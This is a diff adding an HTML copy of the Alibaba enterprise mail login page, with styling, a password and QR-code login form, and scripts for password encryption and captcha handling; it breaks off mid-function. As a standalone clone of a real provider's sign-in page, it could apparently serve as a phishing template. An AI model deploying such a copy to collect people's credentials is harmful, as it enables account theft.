@@ -1,0 +1,1446 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" style="">
+
+<head>
+
+    <script src="https://mailsso.mxhichina.com/home/js/jquery.1.5.2.min.js" type="text/javascript"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.20.0/axios.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://mailsso.mxhichina.com/home/css/guide.css?t=20210720">
+    </link>
+    <link rel="stylesheet" type="text/css" href="https://mailsso.mxhichina.com/home/css/common.css">
+    </link>
+    <link rel="shortcut icon" href="https://mailsso.mxhichina.com/favicon.ico" type="image/x-icon" />
+
+    <script type="text/javascript">
+        CONFIG = {
+            checkCodeUrl: "http://pin2.aliyun.com/get_img?type=150_40&identity=mailsso.mxhichina.com&sessionid=",
+            csrfKey: "_tb_token_",
+            csrfToken: "PkUG4Nmz2w"
+
+        }
+    </script>
+    <style>
+        /* nocaptcha start */
+        /*
+       #imgCaptcha .imgCaptcha_text input {
+           display:none !important;
+       }
+   
+       #imgCaptcha .imgCaptcha_text {
+           display:none !important;
+       }
+       */
+
+
+        .nc-container.tb-login #imgCaptcha #scale_submit {
+            width: 247px !important;
+            margin-left: 4px !important;
+        }
+
+
+        #imgCaptcha .imgCaptcha_text input {
+            margin-top: 0px !important;
+            /*border-width: 1px;
+           border-color: #bbbbbb;
+           border-style: solid;*/
+
+            /*width: 243px;*/
+            height: 22px !important;
+            line-height: 22px !important;
+            /*background-color: #eef3f8 !important;*/
+            background-color: #fff9fb !important;
+            border: 1px solid #bac5d4 !important;
+            color: #92a4bf !important;
+            padding: 5px !important;
+            -webkit-border-radius: 5px !important;
+            -moz-border-radius: 5px !important;
+            border-radius: 5px !important;
+
+        }
+
+        #imgCaptcha .imgCaptcha_img {
+            margin: 5px 0 0 110px !important;
+        }
+
+
+        .nc-container.tb-login #_btn_1 {
+            top: 20px !important;
+            padding-top: 20px !important;
+            /*_top: -17px !important;*/
+        }
+
+
+        #noCaptchaDomId {
+            z-index: 11;
+            margin-top: 0px !important;
+        }
+
+
+        .nc_scale {
+            width: 255px !important;
+        }
+
+        .login_placeholder_nocaptcha {
+            font-size: 14px;
+            color: #92a4bf;
+            width: 100%;
+            height: 34px;
+            margin: 0 auto 10px;
+            position: relative;
+        }
+
+        .nc_scale .scale_text2 b {
+            padding-left: 80px;
+        }
+
+
+
+        .nc-container p {
+            margin: 0;
+        }
+
+        #J_LoginBox .nc-container.tb-login #clickCaptcha {
+            padding-top: 26px;
+        }
+
+        #J_LoginBox .nc-container.tb-login #imgCaptcha,
+        .nc-container.tb-login #clickCaptcha {
+            min-height: 250px !important;
+        }
+
+        #imgCaptcha {
+            padding-bottom: 0px !important;
+            height: 208px !important;
+        }
+
+        #clickCaptcha .clickCaptcha_img img {
+            width: 220px !important;
+            height: 220px !important;
+            margin-left: 18px !important;
+        }
+
+        .nc-container.tb-login #imgCaptcha .imgCaptcha_text {
+            margin-left: 5px !important;
+        }
+
+        #clickCaptcha .clickCaptcha_text {
+            height: 28px !important;
+        }
+
+        .nc-container.tb-login #imgCaptcha {
+            padding-top: 35px !important;
+        }
+
+
+        /*
+       .nc-container.tb-login #_btn_1 {
+           top: 45px !important;
+       }
+       */
+
+
+
+        /* nocaptcha end */
+
+
+
+        .inline_block {
+            vertical-align: top;
+            display: inline-block;
+            *display: inline;
+            zoom: 1;
+        }
+
+        .ellipsis {
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            overflow: hidden;
+            zoom: 1;
+        }
+
+        .alpha_40_ie {
+            filter: alpha(opacity=40);
+        }
+
+        .alpha_40_other {
+            -moz-opacity: 0.4;
+            -khtml-opacity: 0.4;
+            opacity: 0.4;
+        }
+
+        .login_section {
+            font-size: 12px;
+            width: 255px;
+            margin: 0 auto 0;
+            position: relative;
+            padding-top: 2px;
+        }
+
+        .login_logo {
+            background-image: url(https://mailsso.mxhichina.com/home/images/smart/login-logo.png);
+            width: 104px;
+            line-height: 27px;
+            height: 27px;
+        }
+
+        .expire_logo {
+            background-image: url(https://mailsso.mxhichina.com/home/images/smart/wrong.png);
+            ;
+            width: 16px;
+            height: 16px;
+            line-height: 16px;
+            margin: 3px 0;
+        }
+
+        .expire_tips_label {
+            height: 22px;
+            line-height: 22px;
+            font-size: 11px;
+            color: #f26064;
+        }
+
+        .login_qr_code_wrap {
+            width: 255px;
+            display: none;
+            z-index: 100;
+            position: relative;
+            margin: 0 auto 0;
+            height: 196px;
+        }
+
+        .login_switch_qr_wrap {
+            position: absolute;
+            right: 0px;
+            background-image: url(https://mailsso.mxhichina.com/home/images/smart/sq.png);
+            width: 42px;
+            height: 42px;
+            cursor: pointer;
+            bottom: 0px;
+        }
+
+        .login_switch_qr_wrap:hover {
+            background-image: url(https://mailsso.mxhichina.com/home/images/smart/sq_hover.png);
+        }
+
+        .login_app_wrap {
+            width: 100%;
+            background-color: #ffffff;
+            height: 42px;
+            bottom: 0px;
+            left: 0px;
+            position: absolute;
+        }
+
+        .login_app_ios_wrap {
+            position: absolute;
+            left: 20px;
+            bottom: 0px;
+            height: 42px;
+            width: 70px;
+            background-image: url(https://mailsso.mxhichina.com/home/images/new_app_iOS.png);
+        }
+
+        .login_app_ios_wrap:hover {
+            background-image: url(https://mailsso.mxhichina.com/home/images/new_app_iOS_hover.png);
+        }
+
+        .login_app_android_wrap {
+            position: absolute;
+            left: 91px;
+            bottom: 0px;
+            height: 42px;
+            width: 90px;
+            background-image: url(https://mailsso.mxhichina.com/home/images/new_android.png)
+        }
+
+        .login_app_android_wrap:hover {
+            background-image: url(https://mailsso.mxhichina.com/home/images/new_android_hover.png)
+        }
+
+
+
+        .login_switch_login_wrap {
+            position: absolute;
+            right: 0px;
+            background-image: url(https://mailsso.mxhichina.com/home/images/smart/sq_close.png);
+            width: 42px;
+            height: 42px;
+            cursor: pointer;
+            bottom: 0px;
+        }
+
+        .login_switch_login_wrap:hover {
+            background-image: url(https://mailsso.mxhichina.com/home/images/smart/sq_close_hover.png);
+        }
+
+        .login_scanarea_wrap {
+            background-image: url(https://mailsso.mxhichina.com/home/images/smart/saosao.png);
+            width: 176px;
+            height: 150px;
+            margin-left: 46px;
+            margin-top: 30px;
+            margin-bottom: 30px;
+        }
+
+        .login_qccode {
+            width: 150px;
+            height: 150px;
+            margin-left: 50px;
+            margin-top: 30px;
+            margin-bottom: 30px;
+        }
+
+        .login_scanarea_ok_logo {
+            background-image: url(https://mailsso.mxhichina.com/home/images/smart/correct.png);
+            width: 20px;
+            height: 20px;
+        }
+
+        .login_expire_wrap {
+            text-align: center;
+            border: solid 1px #fae0d5;
+            background-color: #fcefea;
+            height: 24px;
+        }
+
+        .login_scanarea_top_tips {
+            line-height: 36px;
+            text-align: center;
+        }
+
+        .login_scanarea_top_label {
+            height: 20px;
+            line-height: 20px;
+            font-size: 14px;
+        }
+
+        .login_scanarea_bottom_tips {
+            color: #3B9BDC;
+            font-size: 13px;
+            line-height: 14px;
+            margin-left: 65px;
+            text-decoration: none;
+        }
+
+        .login_scanarea_tips_label {
+            height: 20px;
+            line-height: 20px;
+            font-size: 16px;
+        }
+
+        .login_scanarea_result_label {
+            height: 20px;
+            line-height: 20px;
+            font-size: 12px;
+            color: gray;
+            margin-top: 25px;
+        }
+
+        .refresh_btn {
+            width: 80px;
+            height: 25px;
+            background-color: #3897d4;
+            border-radius: 2;
+            font-size: 12px;
+            line-height: 25px;
+            text-align: center;
+            color: #ffffff;
+            margin-left: 85px;
+            margin-bottom: 10px;
+            cursor: pointer;
+        }
+
+        .login_scanarea_result_wrap {
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        .login_wrap {
+            position: relative;
+        }
+
+        .login_placeholder_input {
+            font-size: 14px;
+            color: #92a4bf;
+            width: 100%;
+            height: 34px;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+
+        .login_username_placeholder_input {
+            z-index: 10;
+            height: 44px;
+        }
+
+        .login_input {
+            width: 243px;
+            height: 22px;
+            line-height: 22px;
+            background-color: #eef3f8;
+            border: 1px solid #bac5d4;
+            color: #92a4bf;
+            padding: 5px;
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+        }
+
+        .login_input_account {
+            width: 253px;
+            height: 32px;
+            line-height: 22px;
+            background-color: #eef3f8;
+            border: 1px solid #bac5d4;
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+            position: relative;
+        }
+
+        .login_input_name {
+            width: 132px;
+            height: 22px;
+            line-height: 22px;
+            background-color: #eef3f8;
+            color: #92a4bf;
+            padding: 5px;
+            border: 0 none;
+            float: left;
+            -webkit-border-radius: 5px 0 0 5px;
+            -moz-border-radius: 5px 0 0 5px;
+            border-radius: 5px 0 0 5px;
+        }
+
+        .login_input_mail {
+            width: 100px;
+            height: 22px;
+            line-height: 22px;
+            background-color: #eef3f8;
+            color: #333333;
+            padding: 5px;
+            border: 0 none;
+            border-left: 1px solid #bac5d4;
+            float: left;
+            font-size: 12px;
+            -webkit-border-radius: 0 5px 5px 0;
+            -moz-border-radius: 0 5px 5px 0;
+            border-radius: 0 5px 5px 0;
+            text-overflow: ellipsis;
+        }
+
+        .login_placeholder {
+            position: absolute;
+            width: 235px;
+            height: 26px;
+            line-height: 26px;
+            padding: 5px 10px;
+            top: 0;
+            left: 0;
+            cursor: text;
+        }
+
+        .login_hasome .login_placeholder {
+            display: none;
+        }
+
+        .login_submit_btn {
+            padding: 3px 0;
+            width: 255px;
+            line-height: 30px;
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+            display: block;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: bold;
+            text-align: center;
+            border: 1px solid #3790CC;
+            background-color: #3B9BDC;
+            background: -moz-linear-gradient(top, #3B9BDC, #3790CC);
+            background: -webkit-linear-gradient(top, #3B9BDC, #3790CC);
+            background: -o-linear-gradient(top, #3B9BDC, #3790CC);
+            background: linear-gradient(top, #3B9BDC, #3790CC);
+        }
+
+        .login_row {
+            margin-bottom: 10px;
+            overflow: hidden;
+        }
+
+        .login_button_row {
+            overflow: hidden;
+        }
+
+        .login_checkcode_wrap {
+            display: none;
+            float: right;
+        }
+
+        .login_remember_wrap {
+            height: 30px;
+        }
+
+        .login_remember_name {
+            float: left;
+            height: 20px;
+            line-height: 20px;
+            padding: 0 6px;
+            overflow: hidden;
+            color: #565551;
+        }
+
+        .login_remember_check {
+            vertical-align: top;
+            float: left;
+            margin-top: 4px;
+        }
+
+        .login_checkcode {
+            height: 20px;
+            width: 90px;
+            line-height: 20px;
+            background-color: #eef3f8;
+            border: 1px solid #bac5d4;
+            padding: 5px;
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+
+            vertical-align: top;
+        }
+
+        .login_checkcode_ico {
+            border: 1px solid #bac5d4;
+            cursor: pointer;
+            width: 115px;
+        }
+
+        .login_checkcode_ico {
+            position: absolute;
+            width: 115px;
+            height: 30px;
+            border: 1px solid #bac5d4;
+            cursor: pointer;
+            top: 0;
+            right: 20px;
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+        }
+
+        .ico_unchecked,
+        .ico_checked {
+            cursor: pointer;
+            width: 13px;
+            height: 13px;
+        }
+
+        .ico_unchecked {
+            background: url(https://mailsso.mxhichina.com/home/images/main.png) -125px 0 no-repeat;
+        }
+
+        .ico_checked {
+            background: url(https://mailsso.mxhichina.com/home/images/main.png) -145px 0 no-repeat;
+        }
+
+        .login_error_wrap {
+            white-space: nowrap;
+            background-color: #fff8f4;
+            border: 1px solid #e3abb9;
+            line-height: 20px;
+            padding: 2px 4px;
+            overflow: hidden;
+            font-size: 12px;
+            color: #e57b89;
+            margin-bottom: 10px;
+        }
+
+        .ico_error {
+            width: 14px;
+            height: 14px;
+            vertical-align: text-bottom;
+            background: url(https://mailsso.mxhichina.com/home/images/main.png) -105px 0 no-repeat;
+        }
+
+        button {
+            padding: 0;
+            border: 0;
+            background: 0;
+            cursor: pointer;
+        }
+
+        .linebr {
+            clear: both;
+            /* 清除左右浮动 */
+            word-break: break-word;
+            /* 文本行的任意字内断开 */
+            word-wrap: break-word;
+            /* IE */
+            white-space: -moz-pre-wrap;
+            /* Mozilla */
+            white-space: -hp-pre-wrap;
+            /* HP printers */
+            white-space: -o-pre-wrap;
+            /* Opera 7 */
+            white-space: -pre-wrap;
+            /* Opera 4-6 */
+            white-space: pre;
+            /* CSS2 */
+            white-space: pre-wrap;
+            /* CSS 2.1 */
+            white-space: pre-line;
+            /* CSS 3 (and 2.1 as well, actually) */
+        }
+
+        .login_helper_text {
+            line-height: 20px;
+            color: #999999;
+            margin: 0 5px 0 0;
+            float: right;
+
+        }
+
+        .login_dynamic_code_button_wrap {
+            float: left;
+            font-size: 12px;
+        }
+
+        .login_dynamic_code_button {
+            padding: 11px 8px;
+            -webkit-border-radius: 5px;
+            -moz-border-radius: 5px;
+            border-radius: 5px;
+            margin-left: 5px;
+        }
+
+        body.normal_body {
+            margin: 25px 0 0 0;
+
+        }
+
+        body.error_body {
+            margin: 0px;
+        }
+
+        .domain-username-wrap {
+            width: 100px;
+            display: inline-block;
+        }
+
+        .domain-username-wrap #username {
+            width: 90px;
+        }
+
+        .domain-select {
+            height: 34px;
+            border: 1px solid #bac5d4;
+            padding: 8px 0;
+            border-radius: 5px;
+            background-color: #eef3f8;
+            color: #92a4bf;
+            width: 130px;
+        }
+    </style>
+
+</head>
+
+<body id="J_LoginBox" style="overflow-y: hidden;" class="normal_body ">
+    <img id="test-img"
+        style="border:0;margin:0;padding:0;position:absolute;overflow:hidden;top:-10000px;left:-10000px;z-index:-1000;" />
+
+
+
+    <div>
+
+        <form id="login_submit_form" method="post">
+
+            <input name='_tb_token_' type='hidden' value='PkUG4Nmz2w'>
+            <input type="hidden" id="action" name="action" value="SsoLoginAction" />
+            <input type="hidden" name="event_submit_do_login" value="true" />
+            <input type="hidden" name="appCode" value="smartmail" />
+            <input type="hidden" name="redirectUrl"
+                value="https://mail.mxhichina.com/alimail/auth/callbackForCore?reurl=%2Falimail%2F" />
+            <input type="hidden" name="errorUrl" value="" />
+            <input type="hidden" name="deviceId" value="7b599e38c6f44eae8264ded85d340441" />
+            <input type="hidden" name="network_env" value="1" />
+            <input type="hidden" name="umid_token" id="umid_token" />
+            <input type="hidden" name="ua_token" id="ua_token" />
+            <input type='hidden' name="ua" id='UA_InputId' />
+            <input type="hidden" name="is_umid_ready" value="0" id="isUmidReady" />
+            <input type="hidden" name="is_img_available" value="0" id="is_img_available" />
+            <input type="hidden" name="_fm.l._0.p" id="rsautil_value" />
+
+            <input type="hidden" name="_fm.l._0.au" value="1" id="authMode" />
+            <input type="hidden" name="_fm.l._0.r" value="0" id="login_remember" />
+            <input type="hidden" name="_fm.l._0.ch" id="check_code_session_id" />
+
+            <input type='hidden' name="no_captcha_sig" id='no_captcha_sig' />
+            <input type='hidden' name="no_captcha_sessionid" id='no_captcha_sessionid' />
+
+            <div class="login_wrap">
+                <div class="login_section">
+
+                    <div class="login_error_wrap" id="login_error_line" style="display:none ">
+                        <img src="https://mailsso.mxhichina.com/home/images/blank.gif" class="ico_error">
+                        <span class="text_middle login_error_text linebr"></span>
+                    </div>
+
+                    <div class="login_placeholder_input login_username_placeholder_input">
+
+                        <input type="text" id="username" name="_fm.l._0.a" value="" placeholder="帐号" class="login_input"
+                            autocomplete="off">
+                        <div style="padding:0px 0px 0px 5px;margin: 0px;position:relative;top:7px;font-size: 12px;">
+                            请填写企业邮箱的完整帐号，或管理员帐号。</div>
+
+
+                    </div>
+                    <div id="password_wrap" class="login_placeholder_input" style="margin-bottom:10px">
+                        <input type="password" id="password" value="" placeholder="密码" class="login_input">
+                    </div>
+
+                    <div id="dynamic_code_wrap" class="login_placeholder_input" style="display: none">
+                        <input type="text" maxlength="10" name="_fm.l._0.d" value="" id="randomcode" class="login_input"
+                            style="width:140px;float: left;" placeholder="动态验证码" />
+                        <div class="login_dynamic_code_button_wrap">
+                            <div class="login_dynamic_code_button button_tinge" id="getDynamicCode"
+                                href="javascript:void(0);" hidefocus="true">
+                                获取动态密码
+                            </div>
+                            <div class="login_dynamic_code_button button_disabled" id="getDynamicCodeCount"
+                                href="javascript:void(0);" hidefocus="true" style="display: none">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="check_code_wrap" class="login_placeholder_input" style="margin-bottom:10px;display:none">
+                        <input type="text" id="login_checkcode" name="_fm.l._0.c" class="login_checkcode" maxlen="6"
+                            placeholder="验证码">
+                        <img id="login_checkcode_ico" class="login_checkcode_ico" title="点击刷新">
+                    </div>
+
+
+                    <!--滑动验证start-->
+                    <!--滑动验证end-->
+
+                    <div id="login_remember_wrap" class="login_remember_wrap">
+                        <img id="login_remember_check" src="https://mailsso.mxhichina.com/home/images/blank.gif"
+                            class="sprites ico_unchecked login_remember_check" />
+
+                        <div class="login_remember_name">
+                            <span class="cursor_pointer text_middle">记住用户名</span>
+                        </div>
+
+                        <div class="login_helper_text"><a
+                                href=" html/forgetpassword/index?login_url=https://mail.mxhichina.com&amp;network_env=1&amp;lang=zh_CN "
+                                target="_blank">忘记密码</a></div>
+
+
+                    </div>
+
+                    <div class="login_button_row" style="clear: both">
+                        <button id="login_submit_btn" type="submit" class="login_submit_btn">登录</button>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="login_qr_code_wrap">
+                <div class="login_scanarea_top_tips">
+                    <div id="qrcode_tip" class="inline_block login_scanarea_top_label">使用阿里邮箱APP扫描安全登录</div>
+                </div>
+
+                <div class="login_expire_wrap" style="display: none">
+                    <div class="inline_block expire_logo">&nbsp;</div>
+                    <div class="inline_block ellipsis expire_tips_label">二维码已过期，请刷新二维码重新登录</div>
+                </div>
+
+                <div class="login_center_wrap">
+                    <div class="login_scanarea_wrap" id="login_scanarea_wrap" style="display: none"></div>
+                    <img class="login_qccode" id="login_qccode" style="display: block"></img>
+                </div>
+
+                <div class="login_scanarea_result_wrap" style="display: none">
+                    <div class="inline_block login_scanarea_ok_logo"></div>
+                    <div class="inline_block login_scanarea_tips_label">扫描成功</div>
+                    <div class="login_scanarea_result_label">请按手机提示操作确认登录，请勿刷新页面</div>
+                </div>
+
+                <div class="refresh_btn" style="display: none" onclick="javascript:refreshQrCode('1');">刷新二维码</div>
+                <a href="http://wanwang.aliyun.com/mail/app/" target="_blank"
+                    class="login_scanarea_bottom_tips">下载安装阿里邮箱APP</a>
+            </div>
+        </form>
+    </div>
+
+    <div class="login_app_wrap">
+        <a class="login_app_ios_wrap" href="https://itunes.apple.com/cn/app/id923828102" target="_blank"></a>
+        <a class="login_app_android_wrap"
+            href="https://download.alicdn.com/wireless/alimei-android-outside/release/cloudmail.apk"
+            target="_blank"></a>
+    </div>
+    <div class="login_switch_qr_wrap" onclick="javascript:switchQrArea();"></div>
+    <div class="login_switch_login_wrap" onclick="javascript:switchLoginArea();" style="display: none"></div>
+</body>
+
+<script src="https://mailsso.mxhichina.com/home/js/jsencrypt.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+    window.authMode = "1";
+
+    var checkCodeWrap = $("#check_code_wrap");
+    var username = $("#username");
+    var password = $("#password").val("");
+    var oRememberNode = $("#login_remember");
+    var domainsSize = 0;
+    var selectDomains = $("#select_domains");
+    var remember = $("#login_remember_check").click(function () {
+        var oCheckNode = $(this);
+        var checkCls = "ico_checked";
+        if (oCheckNode.hasClass(checkCls)) {
+            oCheckNode.removeClass(checkCls);
+            oRememberNode.val("0");
+        } else {
+            oCheckNode.addClass(checkCls);
+            oRememberNode.val("1");
+        }
+    });
+
+
+    window.usernameVal = username.val();
+    if (domainsSize > 0 && $.trim(username.val()) != "") {
+        window.usernameVal = $.trim(username.val()) + "@" + selectDomains.val();
+    }
+    username.blur(function () {
+        var userNameValue = username.val();
+        if (domainsSize > 0 && $.trim(username.val()) != "") {
+            userNameValue = $.trim(username.val()) + "@" + selectDomains.val();
+        }
+        if (usernameVal == userNameValue) {
+            return;
+        }
+        usernameVal = userNameValue;
+        refreshCheckCode(checkCodeWrap, username, true);
+    });
+    if (domainsSize > 0) {
+        selectDomains.change(function () {
+            var userNameValue = username.val();
+            if (domainsSize > 0 && $.trim(username.val()) != "") {
+                userNameValue = $.trim(username.val()) + "@" + selectDomains.val();
+            }
+            if (usernameVal == userNameValue) {
+                return;
+            }
+            usernameVal = userNameValue;
+            refreshCheckCode(checkCodeWrap, username, true);
+        });
+    }
+    checkCodeWrap.find("img").click(function () {
+        refreshCheckCode(checkCodeWrap, username);
+    });
+
+    setAuthMode(window.authMode);
+
+    refreshCheckCode(checkCodeWrap, username, true);
+
+
+
+
+    $("#login_submit_form").submit(function (e) {
+        var password_val = $("#password").val();
+
+        if (window.uaToken != undefined) {
+            $("#ua_token").val(window.uaToken);
+        }
+        if (isEncrypt()) {
+            var rsa_value = encrypt(password_val);
+            $("#rsautil_value").val(rsa_value);
+        } else {
+            $("#rsautil_value").val(password_val);
+        }
+
+        var isDefaultToken = isDefaultNewUmidToken();
+
+        if (isDefaultToken) {
+            $("#isUmidReady").val("0");
+        } else {
+            $("#umid_token").val(getNewUmidToken());
+            $("#isUmidReady").val("1");
+        }
+
+    });
+
+    function isEncrypt() {
+        var domains = "xhisense.xyz,csgihk.cn,demo.aliyun.com";
+        var publicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMaGTnBAk6BOnPa6PF4WB29sCfyfs1rKq0wHWyuHwAneeym4LNeJcmqIy+3CU+03Q5n+7J7KapHWqh3cw73G2Cv6uzyFOlY3ElkdgzK3svyY0H2O0Xgy+6+IJc41nUqqBSH3uxtxQvCznMftcaAAby68zEqrJHLbqzXR0W41tWGwIDAQAB";
+        var username_val = $("#username").val();
+        var password_val = $("#password").val();
+
+        if (!publicKey || !domains || !username_val || !password_val) {
+            return false;
+        }
+
+        var userDomain = username_val.split("@")[1];
+        var domainList = domains.split(",");
+        var length = domainList.length;
+        if (!userDomain || !length) {
+            return false;
+        }
+        for (var i = 0; i < length; i++) {
+            var domain = domainList[i];
+            if (!domain) {
+                continue;
+            }
+            if (domain.toLowerCase() === userDomain.toLowerCase()) {
+                return true;
+            }
+            if (domain === "*") {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    function encrypt(password) {
+        var key = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMaGTnBAk6BOnPa6PF4WB29sCfyfs1rKq0wHWyuHwAneeym4LNeJcmqIy+3CU+03Q5n+7J7KapHWqh3cw73G2Cv6uzyFOlY3ElkdgzK3svyY0H2O0Xgy+6+IJc41nUqqBSH3uxtxQvCznMftcaAAby68zEqrJHLbqzXR0W41tWGwIDAQAB";
+        var encryptor = new JSEncrypt();
+        encryptor.setPublicKey(key);
+        return encryptor.encrypt(password);
+    }
+
+    function refreshCheckCode(checkCodeWrap, username, needCheckAccount) {
+
+        if (window.authMode != "1") {
+            return;
+        }
+        var userNameValue = username.val();
+        if (domainsSize > 0 && $.trim(username.val()) != "") {
+            userNameValue = $.trim(username.val()) + "@" + selectDomains.val();
+        }
+
+        if (userNameValue == "") {
+            checkCodeWrap.hide();
+            return;
+        }
+
+        if (needCheckAccount != undefined && needCheckAccount == true) {
+            checkCodeWrap.hide();
+            jQuery.post("ajax/check_account.json", { "userId": userNameValue, "domain": "mail.mxhichina.com", "network_env": "1" }, function (data) {
+
+                if (data != null && data != undefined && data.content != null && data.content != undefined && data.content.success) {
+                    var model = data.content.data;
+
+                    if (window.authMode == "1" && model.authMode != "1" && model.authMode != "") {
+                        setAuthMode(model.authMode);
+                        return;
+                    }
+
+                    if (window.authMode != "1") {
+                        return;
+                    }
+
+
+                    if (model.checkCode == "pic") {
+                        checkCodeWrap.find("img").attr("src", model.checkCodePicUrl);
+                        $("#check_code_session_id").val(model.checkCodePicId);
+                        checkCodeWrap.show();
+                        return;
+                    }
+
+                    if (model.checkCode == "sms") {
+
+                    }
+                }
+            });
+
+            return;
+
+        }
+
+
+        jQuery.post("ajax/common/get_img_check_code.json", { "network_env": "1" }, function (data) {
+
+            if (data != null && data != undefined && data.content != null && data.content != undefined) {
+                var model = data.content.data;
+                $("#check_code_session_id").val(model.sessionId);
+                checkCodeWrap.find("img").attr("src", model.url);
+                checkCodeWrap.show();
+            }
+        });
+
+
+
+
+
+    }
+    function post(url, param, callback) {
+        var postdata = {};
+        postdata[CONFIG.csrfKey] = CONFIG.csrfToken;
+        postdata = $.extend(param, postdata);
+        $.post(url, postdata, function (data) {
+            if (data.hasError) {
+                return;
+            }
+            callback(data.content);
+        });
+    }
+
+    var JPlaceHolder = {
+        _check: function () {
+            return 'placeholder' in document.createElement('input');
+        },
+        init: function () {
+            if (!this._check()) {
+                this.fix();
+            }
+        },
+        fix: function () {
+            jQuery(':input[placeholder]').each(function (index, element) {
+                var self = $(this), txt = self.attr('placeholder');
+                self.wrap($('<div></div>').css({ position: 'relative', zoom: '1', border: 'none', background: 'none', padding: 'none', margin: 'none' }));
+                var pos = self.position(), h = self.outerHeight(true), paddingleft = self.css('padding-left');
+                var holder = $('<span></span>').text(txt).css({ position: 'absolute', left: pos.left, top: pos.top, lienHeight: h, paddingLeft: "5px", paddingTop: "10px", color: '#aaa' }).appendTo(self.parent());
+
+                self.focusin(function (e) {
+                    holder.hide();
+                }).focusout(function (e) {
+                    if (!self.val()) {
+                        holder.show();
+                    }
+                });
+                holder.click(function (e) {
+                    holder.hide();
+                    self.focus();
+                });
+                if (self.val() != "") {
+                    holder.hide();
+                }
+            });
+        }
+    };
+    jQuery(function () {
+        JPlaceHolder.init();
+    });
+
+
+    function setAuthMode(mode) {
+
+        if (mode == undefined) {
+            mode = "1";
+        }
+
+        window.authMode = mode;
+
+        if (mode == "1") {
+            jQuery("#password_wrap").show();
+            jQuery("#dynamic_code_wrap").hide();
+            jQuery("#authMode").val("1");
+            return;
+        }
+        if (mode == "2") {
+            jQuery("#password_wrap").hide();
+            jQuery("#dynamic_code_wrap").show();
+            jQuery("#authMode").val("2");
+            checkCodeWrap.hide();
+            return;
+        }
+        if (mode == "4") {
+            switchQrArea();
+            jQuery(".login_switch_login_wrap").hide();
+            jQuery("#qrcode_tip").text("您已开启刷脸登录并受到更高等级的安全保护，请扫码登录以确认您的身份!");
+            return;
+        }
+    }
+    function showError(msg) {
+        var errorWrap = $("#login_error_line");
+        errorWrap.find("span").text(msg);
+        errorWrap.show(500);
+        setTimeout("$('#login_error_line').hide(500);", 1000);
+    }
+
+</script>
+
+<script type="text/javascript">
+    var time;
+    function getLoginStatus() {
+        var param = "&appCode=" + encodeURI("smartmail") + "&redirectUrl=" + encodeURI("https://mail.mxhichina.com/alimail/auth/callbackForCore?reurl=%2Falimail%2F") + "&errorUrl=" + encodeURI("") + "&deviceId=" + encodeURI("7b599e38c6f44eae8264ded85d340441") + "&lang=zh_CN";
+        $.ajax({
+            type: "GET",
+            url: "/ajax/login_by_qrCode.json?timestamp=" + Date.parse(new Date()) + param,
+            dataType: 'json',
+            success: function (result) {
+                if (result) {
+                    var data = eval(result);
+                    initPage();
+                    if (data.content && data.content.errorCode) {
+                        var errorCode = data.content.errorCode;
+                        if (errorCode == "1501") {
+                            //donoting
+                        } else if (errorCode == "1500") {
+                            // expired
+                            if (navigator.userAgent.indexOf('MSIE') >= 0) {
+                                $(".login_qccode").addClass("alpha_40_ie");
+                            } else {
+                                $(".login_qccode").addClass("alpha_40_other");
+                            }
+                            var QrAreaNode = document.getElementById("login_qccode");
+                            var scanAreaNode = document.getElementById("login_scanarea_wrap");
+                            scanAreaNode.style.marginTop = "4px";
+                            QrAreaNode.style.marginTop = "4px";
+                            $(".login_expire_wrap").show();
+                            $(".refresh_btn").show();
+                            clearInterval(time);
+                        } else if (errorCode == "110") {
+                            // ok
+                            $(".login_scanarea_bottom_tips").hide();
+                            $(".login_qccode").hide();
+                            $(".login_scanarea_result_wrap").show();
+                            // stop interval
+                            clearInterval(time);
+                            data.content.data.redirectUrl && (window.top.location.href = data.content.data.redirectUrl);
+                        } else {
+                            clearInterval(time);
+                            if (data.content.errorMsg) {
+                                $(".expire_tips_label").html(data.content.errorMsg);
+                                $(".login_expire_wrap").show();
+                            }
+                        }
+                    }
+                }
+            }
+        });
+    }
+
+    function initPage() {
+        $(".login_expire_wrap").hide();
+        $(".refresh_btn").hide();
+    }
+
+    function refreshQrCode(config) {
+        var param = "&appCode=" + encodeURI("smartmail") + "&redirectUrl=" + encodeURI("https://mail.mxhichina.com/alimail/auth/callbackForCore?reurl=%2Falimail%2F") + "&errorUrl=" + encodeURI("") + "&deviceId=" + encodeURI("7b599e38c6f44eae8264ded85d340441") + "&lang=zh_CN";
+        document.getElementById("login_qccode").src = "/generateLoginQRCode.do?timestamp=" + Date.parse(new Date()) + param;
+        $(".login_expire_wrap").hide();
+        $(".refresh_btn").hide();
+        if (navigator.userAgent.indexOf('MSIE') >= 0) {
+            $(".login_qccode").removeClass("alpha_40_ie");
+        } else {
+            $(".login_qccode").removeClass("alpha_40_other");
+        }
+
+        if (config) {
+            self.setTimeout("excuteInterval()", 1000);
+        }
+    }
+
+    function excuteInterval() {
+        time = self.setInterval("getLoginStatus()", 2000);
+    }
+
+    function switchQrArea() {
+        $(".login_section").hide();
+        $(".login_qr_code_wrap").show();
+        $(".login_scanarea_result_wrap").hide();
+        $(".login_scanarea_wrap").hide();
+        $(".login_switch_qr_wrap").hide();
+        $(".login_switch_login_wrap").show();
+        $(".login_qccode").show();
+
+        $(".login_app_wrap").hide();
+
+        // excute Qr code
+        refreshQrCode();
+
+        self.setTimeout("excuteInterval()", 1000);
+
+    }
+    function switchLoginArea() {
